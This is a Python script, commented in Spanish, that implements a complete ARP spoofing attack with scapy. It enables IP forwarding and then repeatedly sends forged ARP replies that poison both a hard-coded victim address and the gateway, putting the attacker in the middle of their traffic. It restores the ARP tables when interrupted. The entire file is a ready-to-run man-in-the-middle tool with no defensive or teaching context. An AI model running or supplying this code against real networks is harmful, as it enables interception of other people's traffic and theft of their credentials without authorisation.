from scapy.all import Ether, ARP, srp, send
import time

class ARPSpoofer:


    def __init__(self, target_ip, host_ip, verbose=True):

        self.target_ip = target_ip
        self.host_ip = host_ip
        self.verbose = verbose
        self.habilitar_enrutamiento_ip()

    def habilitar_enrutamiento_ip(self):

        if self.verbose:
            print("Habilitando el enrutamiento IP...")
        ruta_archivo = "/proc/sys/net/ipv4/ip_forward"
        with open(ruta_archivo) as archivo:
            if archivo.read() == '1':
                return
        with open(ruta_archivo, 'w') as archivo:
            print(1, file=archivo)
        if self.verbose:
            print("Enrutamiento IP activado.")

    @staticmethod
    def obtener_mac(ip):

        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, verbose=0)
        if ans:
            return ans[0][1].src
        
    def spoofear(self, ip_objetivo, ip_anfitrion):

        mac_objetivo = self.obtener_mac(ip_objetivo)
        respuesta_arp = ARP(
            pdst=ip_objetivo,
            hwdst=mac_objetivo,
            psrc=ip_anfitrion,
            op='is-at'
        )
        send(respuesta_arp, verbose=0)
        if self.verbose:
            mac_propia = ARP().hwsrc
            print(f"Paquete ARP enviado a {ip_objetivo}: {ip_anfitrion} está en {mac_propia}")

    def restaurar(self, ip_objetivo, ip_anfitrion):

        mac_objetivo = self.obtener_mac(ip_objetivo)
        mac_anfitrion = self.obtener_mac(ip_anfitrion)
        respuesta_arp = ARP(
            pdst=ip_objetivo,
            hwdst=mac_objetivo,
            psrc=ip_anfitrion,
            hwsrc=mac_anfitrion,
            op='is-at'
        )
        send(respuesta_arp, verbose=0, count=20)
        if self.verbose:
            print(f"Restaurado {ip_objetivo}: {ip_anfitrion} está en {mac_anfitrion}")

def main():

    victima = "192.168.138.137"
    gateway = "192.168.138.2"

    spoofer = ARPSpoofer(victima, gateway)

    try:
        while True:
            spoofer.spoofear(victima, gateway)
            spoofer.spoofear(gateway, victima)
            time.sleep(1)
    except KeyboardInterrupt:
        print("Deteniendo ARP Spoofing. Restaurando la red...")
        spoofer.restaurar(victima, gateway)
        spoofer.restaurar(gateway, victima)

if __name__ == "__main__":
    main()